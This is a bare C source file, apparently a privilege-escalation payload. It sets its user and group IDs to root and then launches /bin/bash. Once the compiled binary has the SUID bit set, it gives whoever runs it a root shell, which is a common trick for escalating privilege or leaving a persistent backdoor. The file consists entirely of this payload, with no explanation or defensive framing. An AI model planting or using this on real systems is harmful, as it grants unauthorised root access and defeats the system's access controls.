#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
int main( void ){

  setuid(0);
  setgid(0);
  execl("/bin/bash", "bash", NULL);

  return 0;
}
